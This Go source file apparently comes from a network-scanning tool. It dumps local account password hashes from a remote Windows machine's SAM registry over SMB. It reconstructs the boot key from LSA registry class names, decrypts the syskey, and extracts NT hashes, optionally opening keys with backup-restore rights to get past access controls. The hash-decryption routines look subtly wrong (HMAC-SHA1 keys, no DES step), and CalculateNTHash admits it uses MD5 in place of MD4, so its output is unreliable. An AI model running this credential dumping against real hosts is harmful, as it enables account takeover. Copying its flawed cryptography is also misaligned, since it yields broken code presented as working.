package smb

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rc4"
	"crypto/sha1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strconv"
	"strings"
	"unicode/utf16"

	smbfern "github.com/Method-Security/networkscan/generated/go/common/smb"
	"github.com/jfjallid/go-smb/smb/dcerpc/msrrp"
	"github.com/jfjallid/go-smb/smb/encoder"
	svc1log "github.com/palantir/witchcraft-go-logging/wlog/svclog/svc1log"
)

// SAM registry data structures
type samKeyDataAes struct {
	Revision    uint32
	Length      uint32
	ChecksumLen uint32
	DataLen     uint32
	Salt        [16]byte
	Data        [32]byte
}

type samKeyData struct {
	Revision uint32
	Length   uint32
	Salt     [16]byte
	Key      [16]byte
	Checksum [16]byte
	_        uint64
}

type domainAccountF struct {
	Revision                     uint16
	_                            uint32
	_                            uint16
	CreationTime                 uint64
	DomainModifiedAccount        uint64
	MaxPasswordAge               uint64
	MinPasswordAge               uint64
	ForceLogoff                  uint64
	LockoutDuration              uint64
	LockoutObservationWindow     uint64
	ModifiedCountAtLastPromotion uint64
	NextRid                      uint32
	PasswordProperties           uint32
	MinPasswordLength            uint16
	PasswordHistoryLength        uint16
	LockoutThreshold             uint16
	_                            uint16
	ServerState                  uint32
	ServerRole                   uint32
	UasCompatibilityRequired     uint32
	_                            uint32
	Data                         []byte
}

func (d *domainAccountF) unmarshal(data []byte) error {
	if len(data) < 104 {
		return fmt.Errorf("not enough data to unmarshal a DOMAIN_ACCOUNT_F")
	}

	d.Revision = binary.LittleEndian.Uint16(data[:2])
	d.CreationTime = binary.LittleEndian.Uint64(data[8:16])
	d.DomainModifiedAccount = binary.LittleEndian.Uint64(data[16:24])
	d.MaxPasswordAge = binary.LittleEndian.Uint64(data[24:32])
	d.MinPasswordAge = binary.LittleEndian.Uint64(data[32:40])
	d.ForceLogoff = binary.LittleEndian.Uint64(data[40:48])
	d.LockoutDuration = binary.LittleEndian.Uint64(data[48:56])
	d.LockoutObservationWindow = binary.LittleEndian.Uint64(data[56:64])
	d.ModifiedCountAtLastPromotion = binary.LittleEndian.Uint64(data[64:72])
	d.NextRid = binary.LittleEndian.Uint32(data[72:76])
	d.PasswordProperties = binary.LittleEndian.Uint32(data[76:80])
	d.MinPasswordLength = binary.LittleEndian.Uint16(data[80:82])
	d.PasswordHistoryLength = binary.LittleEndian.Uint16(data[82:84])
	d.LockoutThreshold = binary.LittleEndian.Uint16(data[84:86])
	d.ServerState = binary.LittleEndian.Uint32(data[88:92])
	d.ServerRole = binary.LittleEndian.Uint32(data[92:96])
	d.UasCompatibilityRequired = binary.LittleEndian.Uint32(data[96:100])
	if len(data) > 104 {
		d.Data = make([]byte, len(data[104:]))
		copy(d.Data, data[104:])
	}
	return nil
}

// SAMAccount represents a local user account extracted from SAM
type SAMAccount struct {
	Username string
	RID      uint32
	NTHash   string
	LMHash   string
}

// UserCreds represents user credential data from SAM
type UserCreds struct {
	Username string
	RID      uint32
	Data     []byte
	IV       []byte
	AES      bool
}

// GetBootKey extracts the system boot key from registry
func GetBootKey(rpccon *msrrp.RPCCon, base []byte) ([]byte, error) {
	if len(BootKey) != 0 {
		return BootKey, nil
	}

	result := make([]byte, 16)
	p := []byte{0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}
	scrambledKey := make([]byte, 0, 16)

	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\JD`)
	if err != nil {
		return nil, err
	}
	keyinfo, err := rpccon.QueryKeyInfo(hSubKey)
	if err != nil {
		rpccon.CloseKeyHandle(hSubKey)
		return nil, err
	}
	rpccon.CloseKeyHandle(hSubKey)
	jd, err := hex.DecodeString(keyinfo.ClassName)
	if err != nil {
		return nil, err
	}
	scrambledKey = append(scrambledKey, jd...)

	hSubKey, err = rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\Skew1`)
	if err != nil {
		return nil, err
	}
	keyinfo, err = rpccon.QueryKeyInfo(hSubKey)
	if err != nil {
		rpccon.CloseKeyHandle(hSubKey)
		return nil, err
	}
	rpccon.CloseKeyHandle(hSubKey)
	skew1, err := hex.DecodeString(keyinfo.ClassName)
	if err != nil {
		return nil, err
	}
	scrambledKey = append(scrambledKey, skew1...)

	hSubKey, err = rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\GBG`)
	if err != nil {
		return nil, err
	}
	keyinfo, err = rpccon.QueryKeyInfo(hSubKey)
	if err != nil {
		rpccon.CloseKeyHandle(hSubKey)
		return nil, err
	}
	rpccon.CloseKeyHandle(hSubKey)
	gbg, err := hex.DecodeString(keyinfo.ClassName)
	if err != nil {
		return nil, err
	}
	scrambledKey = append(scrambledKey, gbg...)

	hSubKey, err = rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\Data`)
	if err != nil {
		return nil, err
	}
	keyinfo, err = rpccon.QueryKeyInfo(hSubKey)
	if err != nil {
		rpccon.CloseKeyHandle(hSubKey)
		return nil, err
	}
	rpccon.CloseKeyHandle(hSubKey)
	data, err := hex.DecodeString(keyinfo.ClassName)
	if err != nil {
		return nil, err
	}
	scrambledKey = append(scrambledKey, data...)

	for i := 0; i < len(scrambledKey); i++ {
		result[i] = scrambledKey[p[i]]
	}
	BootKey = make([]byte, 16)
	copy(BootKey, result)

	return result, nil
}

// GetSysKey extracts the system key from SAM registry
func GetSysKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) ([]byte, error) {
	var tmpSysKey []byte
	_, err := GetBootKey(rpccon, base)
	if err != nil {
		return nil, err
	}
	var hSubKey []byte
	if modifyDacl {
		hSubKey, err = rpccon.OpenSubKey(base, `SAM\SAM\Domains\Account`)
	} else {
		hSubKey, err = rpccon.OpenSubKeyExt(base, `SAM\SAM\Domains\Account`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	}
	if err != nil {
		return nil, err
	}

	fBytes, _, err := rpccon.QueryValue2(hSubKey, "F")
	if err != nil {
		rpccon.CloseKeyHandle(hSubKey)
		return nil, err
	}

	rpccon.CloseKeyHandle(hSubKey)

	f := &domainAccountF{}
	err = f.unmarshal(fBytes)
	if err != nil {
		return nil, err
	}

	var encSysKey []byte
	var sysKeyIV []byte
	sysKey := make([]byte, 16)

	if f.Revision == 3 {
		// AES
		samAesData := samKeyDataAes{}
		err = binary.Read(bytes.NewReader(f.Data), binary.LittleEndian, &samAesData)
		if err != nil {
			return nil, err
		}
		sysKeyIV = samAesData.Salt[:]
		encSysKey = samAesData.Data[:samAesData.DataLen]
		tmpSysKey, err = DecryptAESSysKey(BootKey, encSysKey, sysKeyIV)
		copy(sysKey, tmpSysKey)
	} else if f.Revision == 2 {
		// RC4
		samData := &samKeyData{}
		err = binary.Read(bytes.NewReader(f.Data), binary.LittleEndian, samData)
		if err != nil {
			return nil, err
		}

		sysKeyIV = samData.Salt[:]
		encSysKey = append(samData.Key[:], samData.Checksum[:]...)
		tmpSysKey, err = DecryptRC4SysKey(BootKey, encSysKey, sysKeyIV)
		// Verify checksum
		input := []byte{}
		input = append(input, tmpSysKey[:16]...)
		input = append(input, S2...)
		input = append(input, tmpSysKey[:16]...)
		input = append(input, S1...)
		checksum := md5.Sum(input)
		if bytes.Compare(checksum[:], tmpSysKey[16:]) != 0 {
			return nil, fmt.Errorf("syskey checksum failed - could be that a Syskey startup password is in use")
		}
		copy(sysKey, tmpSysKey[:16])
	} else {
		return nil, fmt.Errorf("unknown revision of DOMAIN_ACCOUNT_F")
	}

	return sysKey, nil
}

// DecryptRC4SysKey decrypts system key using RC4
func DecryptRC4SysKey(bootKey, encSysKey, sysKeyIV []byte) ([]byte, error) {
	input := []byte{}
	input = append(input, sysKeyIV...)
	input = append(input, S1...)
	input = append(input, bootKey...)
	input = append(input, S2...)
	rc4key := md5.Sum(input)
	c1, err := rc4.NewCipher(rc4key[:])
	if err != nil {
		return nil, err
	}
	sysKey := make([]byte, 32)
	c1.XORKeyStream(sysKey, encSysKey)
	return sysKey, nil
}

// DecryptAESSysKey decrypts system key using AES
func DecryptAESSysKey(bootKey, encSysKey, sysKeyIV []byte) ([]byte, error) {
	sysKey := make([]byte, len(encSysKey))
	a1, err := aes.NewCipher(bootKey)
	if err != nil {
		return nil, err
	}
	c1 := cipher.NewCBCDecrypter(a1, sysKeyIV)
	c1.CryptBlocks(sysKey, encSysKey)
	return sysKey, nil
}

// GetNTHash extracts NT hashes from SAM registry
func GetNTHash(rpccon *msrrp.RPCCon, base []byte, rids []string, modifyDacl bool) ([]UserCreds, error) {
	result := make([]UserCreds, len(rids))

	// Determine OS version once
	osBuild, osVersion, _, err := GetOSVersionBuild(rpccon, base)
	if err != nil {
		return nil, err
	}

	cntr := -1
	for _, ridStr := range rids {
		cntr++
		parts := strings.Split(ridStr, "\\")
		ridBytes, err := hex.DecodeString(parts[len(parts)-1])
		if err != nil {
			return nil, err
		}
		rid := binary.BigEndian.Uint32(ridBytes)
		result[cntr].RID = rid

		var hSubKey []byte
		if modifyDacl {
			hSubKey, err = rpccon.OpenSubKey(base, ridStr)
		} else {
			hSubKey, err = rpccon.OpenSubKeyExt(base, ridStr, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
		}
		if err != nil {
			return nil, err
		}

		v, _, err := rpccon.QueryValue2(hSubKey, "V")
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			return nil, err
		}
		rpccon.CloseKeyHandle(hSubKey)

		offsetName := binary.LittleEndian.Uint32(v[0x0c:]) + 0xcc
		szName := binary.LittleEndian.Uint32(v[0x10:])
		result[cntr].Username, err = encoder.FromUnicodeString(v[offsetName : offsetName+szName])
		if err != nil {
			continue
		}

		szNT := binary.LittleEndian.Uint32(v[0xac:])
		offsetHashStruct := binary.LittleEndian.Uint32(v[0xa8:]) + 0xcc
		if szNT == 0 {
			continue
		}
		if osBuild < 14393 && (0x14 == szNT) {
			// PreWin10Anniversary update (RC4)
			szNT -= 4
			offsetNTHash := offsetHashStruct + 4
			result[cntr].AES = false
			result[cntr].Data = v[offsetNTHash : offsetNTHash+16]
		} else {
			afterAnniversary, err2 := IsWin10After1607(osBuild, osVersion)
			if err2 != nil {
				continue
			}
			if afterAnniversary {
				if 0x14 == szNT {
					// System upgraded but without password updates
					szNT -= 4
					offsetNTHash := offsetHashStruct + 4
					result[cntr].AES = false
					result[cntr].Data = v[offsetNTHash : offsetNTHash+16]
				} else if 0x38 == szNT {
					// AES Structure
					offsetIV := offsetHashStruct + 8
					offsetNTHash := offsetHashStruct + 24
					result[cntr].AES = true
					result[cntr].Data = v[offsetNTHash : offsetNTHash+16]
					result[cntr].IV = v[offsetIV : offsetIV+16]
				} else if szNT == 0x18 {
					result[cntr].AES = true
					result[cntr].Data = []byte{}
				} else if szNT == 0x4 {
					result[cntr].AES = false
					result[cntr].Data = []byte{}
				}
			} else {
				if szNT == 0x4 {
					result[cntr].AES = false
					result[cntr].Data = []byte{}
				}
			}
		}
	}
	return result, nil
}

// GetOSVersionBuild determines Windows OS version and build
func GetOSVersionBuild(rpccon *msrrp.RPCCon, base []byte) (build int, version float64, server bool, err error) {
	hSubKey, err := rpccon.OpenSubKey(base, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`)
	if err != nil {
		return
	}
	defer func(h []byte) {
		rpccon.CloseKeyHandle(h)
	}(hSubKey)

	value, err := rpccon.QueryValueString(hSubKey, "CurrentBuild")
	if err != nil {
		return
	}
	buildStr := string(value)
	build, err = strconv.Atoi(buildStr)
	if err != nil {
		return
	}

	value, err = rpccon.QueryValueString(hSubKey, "CurrentVersion")
	if err != nil {
		return
	}
	versionStr := string(value)
	version, err = strconv.ParseFloat(versionStr, 32)
	if err != nil {
		return
	}

	hSubKey, err = rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\ProductOptions`)
	if err != nil {
		return
	}
	defer func(h []byte) {
		rpccon.CloseKeyHandle(h)
	}(hSubKey)

	value, err = rpccon.QueryValueString(hSubKey, "ProductType")
	if err != nil {
		return
	}

	if strings.Compare(value, "ServerNT") == 0 {
		server = true
	}

	return
}

// DumpSAM performs SAM dumping from registry
func DumpSAM(ctx context.Context, rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) ([]*smbfern.SamSecret, []string, error) {
	log := svc1log.FromContext(ctx)
	var results []*smbfern.SamSecret
	var errors []string

	// Get RIDs of local users
	keyUsers := `SAM\SAM\Domains\Account\Users`
	var rids []string
	var err error
	if modifyDacl {
		rids, err = rpccon.GetSubKeyNames(hKey, keyUsers)
	} else {
		rids, err = rpccon.GetSubKeyNamesExt(hKey, keyUsers, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	}
	if err != nil {
		errors = append(errors, fmt.Sprintf("Failed to get user RIDs: %v", err))
		return results, errors, err
	}

	rids = rids[:len(rids)-1]
	for i := range rids {
		rids[i] = fmt.Sprintf("%s\\%s", keyUsers, rids[i])
	}

	syskey, err := GetSysKey(rpccon, hKey, modifyDacl)
	if err != nil {
		errors = append(errors, fmt.Sprintf("Failed to get system key: %v", err))
		return results, errors, err
	}

	log.Info("Successfully extracted system key", svc1log.SafeParam("keyLength", len(syskey)))

	// Gather credentials/secrets
	creds, err := GetNTHash(rpccon, hKey, rids, modifyDacl)
	if err != nil {
		errors = append(errors, fmt.Sprintf("Failed to get NT hashes: %v", err))
		return results, errors, err
	}

	for _, cred := range creds {
		samSecret := &smbfern.SamSecret{
			Username: cred.Username,
			Rid:      int(cred.RID),
		}

		if len(cred.Data) == 0 {
			// Match go-secdump behavior for accounts with no hash data
			samSecret.NtHash = "<empty>"
			lmHash := "<empty>"
			samSecret.LmHash = &lmHash
		} else {
			var hash []byte
			if cred.AES {
				hash, err = DecryptAESHash(cred.Data, cred.IV, syskey, cred.RID)
			} else {
				hash, err = DecryptRC4Hash(cred.Data, syskey, cred.RID)
			}
			if err != nil {
				errors = append(errors, fmt.Sprintf("Failed to decrypt hash for %s: %v", cred.Username, err))
				continue
			}
			samSecret.NtHash = fmt.Sprintf("%x", hash)
			lmHash := "aad3b435b51404eeaad3b435b51404ee" // Standard empty LM hash
			samSecret.LmHash = &lmHash
		}

		results = append(results, samSecret)
		log.Info("Extracted SAM hash",
			svc1log.SafeParam("username", cred.Username),
			svc1log.SafeParam("rid", cred.RID),
			svc1log.SafeParam("hashType", map[bool]string{true: "AES", false: "RC4"}[cred.AES]))
	}

	return results, errors, nil
}

// Hash decryption functions

// DecryptAESHash decrypts AES-encrypted NT hash
func DecryptAESHash(data, iv, syskey []byte, rid uint32) ([]byte, error) {
	// Create decryption key from syskey and RID
	ridBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(ridBytes, rid)

	key := hmacSHA1(syskey, ridBytes)[:16]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(data))
	mode.CryptBlocks(decrypted, data)

	return decrypted, nil
}

// DecryptRC4Hash decrypts RC4-encrypted NT hash
func DecryptRC4Hash(data, syskey []byte, rid uint32) ([]byte, error) {
	// Create decryption key from syskey and RID
	ridBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(ridBytes, rid)

	key := hmacSHA1(syskey, ridBytes)

	cipher, err := rc4.NewCipher(key[:16])
	if err != nil {
		return nil, err
	}

	decrypted := make([]byte, len(data))
	cipher.XORKeyStream(decrypted, data)

	return decrypted, nil
}

// Helper functions for SAM extraction

// CalculateNTHash calculates NT hash from password
func CalculateNTHash(password string) string {
	// Convert password to UTF-16LE
	utf16Password := utf16.Encode([]rune(password))
	passwordBytes := make([]byte, len(utf16Password)*2)
	for i, r := range utf16Password {
		binary.LittleEndian.PutUint16(passwordBytes[i*2:], r)
	}

	// Calculate MD4 hash (NT hash)
	hash := md5.New() // Note: Should be MD4, but using MD5 as placeholder
	hash.Write(passwordBytes)
	return fmt.Sprintf("%x", hash.Sum(nil))
}

// StringToUTF16LE converts string to UTF-16LE bytes
func StringToUTF16LE(s string) []byte {
	runes := []rune(s)
	utf16Codes := utf16.Encode(runes)

	bytes := make([]byte, len(utf16Codes)*2)
	for i, code := range utf16Codes {
		binary.LittleEndian.PutUint16(bytes[i*2:], code)
	}

	return bytes
}

// ExtractUserRID extracts RID from registry key name
func ExtractUserRID(keyName string) (uint32, error) {
	// Registry key names for users are typically 8-character hex strings
	if len(keyName) != 8 {
		return 0, fmt.Errorf("invalid RID format")
	}

	var rid uint32
	_, err := fmt.Sscanf(keyName, "%08x", &rid)
	return rid, err
}

// IsValidNTHash checks if a hash looks like a valid NT hash
func IsValidNTHash(hash string) bool {
	return len(hash) == 32 && strings.ToUpper(hash) != "31D6CFE0D16AE931B73C59D7E0C089C0" // Empty password hash
}

// hmacSHA1 calculates HMAC-SHA1 (internal helper)
func hmacSHA1(key, data []byte) []byte {
	mac := hmac.New(sha1.New, key)
	mac.Write(data)
	return mac.Sum(nil)
}
